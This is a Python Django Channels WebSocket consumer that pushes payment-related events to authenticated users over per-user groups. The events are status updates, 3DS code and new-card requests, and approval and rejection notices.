import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from .models import DepositRequest


class PaymentConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.user = self.scope["user"]
        if not self.user.is_authenticated:
            await self.close()
            return

        self.room_name = f"payments_{self.user.id}"
        self.room_group_name = f"payments_{self.user.id}"

        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )
        await self.accept()

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )

    async def receive(self, text_data):
        pass

    async def payment_update(self, event):
        """Отправляет обновление платежа клиенту"""
        await self.send(text_data=json.dumps({
            'type': 'payment_update',
            'deposit_id': event['deposit_id'],
            'action': event['action'],
            'message': event['message'],
            'status': event['status']
        }))

    async def three_ds_request(self, event):
        """Запрашивает 3DS код от пользователя"""
        await self.send(text_data=json.dumps({
            'type': 'three_ds_request',
            'deposit_id': event['deposit_id'],
            'message': event['message']
        }))

    async def new_card_request(self, event):
        """Запрашивает новую карту от пользователя"""
        await self.send(text_data=json.dumps({
            'type': 'new_card_request',
            'deposit_id': event['deposit_id'],
            'message': event['message']
        }))

    async def payment_approved(self, event):
        """Уведомляет об одобрении платежа"""
        await self.send(text_data=json.dumps({
            'type': 'payment_approved',
            'deposit_id': event['deposit_id'],
            'message': event['message'],
            'amount': event['amount']
        }))

    async def payment_rejected(self, event):
        """Уведомляет об отклонении платежа"""
        await self.send(text_data=json.dumps({
            'type': 'payment_rejected',
            'deposit_id': event['deposit_id'],
            'message': event['message']
        }))

















